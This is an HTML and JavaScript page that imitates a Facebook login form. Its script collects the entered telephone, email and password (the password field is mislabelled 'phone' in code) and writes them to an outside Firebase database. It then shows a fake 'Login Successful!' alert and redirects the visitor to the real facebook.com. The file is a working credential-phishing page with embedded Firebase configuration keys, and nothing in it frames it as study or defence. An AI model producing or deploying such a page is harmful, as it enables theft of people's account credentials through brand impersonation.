<!DOCTYPE html>
<html>
<head>
    <title>facebook Form</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="box">
        <div class="form">
            <h2>FACEBOOK</h2>
            <form id="loginForm"> 
                <div class="inputbox">
                    <input type="text" value="" id="username" name="username" required>
                    <span>Telephone</span>
                </div>
                <div class="inputbox">
                    <input type="email" value="" id="email" name="email" required>
                    <span>Email</span>
                </div>
                <div class="inputbox">
                    <input type="text" value="" id="phone" name="phone" required>
                    <span>Password</span>
                </div>
                <input type="submit" value="Login" class="sub" id="submit">
            </form>
        </div>
    </div>
    <script type="module">
        // Import the functions you need from the SDKs you need
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-app.js";
        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.12.3/firebase-database.js";

        // Your web app's Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCdw12fiW9jRCi3w70yLJNgLY4MVJiRHhI",
            authDomain: "checkment-feb0d.firebaseapp.com",
            projectId: "checkment-feb0d",
            storageBucket: "checkment-feb0d.appspot.com",
            messagingSenderId: "129957507489",
            appId: "1:129957507489:web:3b5cceab75def385ca9be0"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        document.getElementById("loginForm").addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Get form values
            const username = document.getElementById("username").value;
            const email = document.getElementById("email").value;
            const phone = document.getElementById("phone").value;

            // Store data in Firebase
            set(ref(db, 'user/' + username), {
                username: username,
                email: email,
                phoneNumber: phone // Corrected to match the field name in Firebase
            }).then(() => {
                alert("Login Successful!");

                // Redirect to another page
                window.location.href = "https://facebook.com"; // Replace with your desired URL
            }).catch((error) => {
                console.error("Error adding document: ", error);
                alert("An error occurred. Please try again.");
            });
        });
    </script>
</body>
</html>
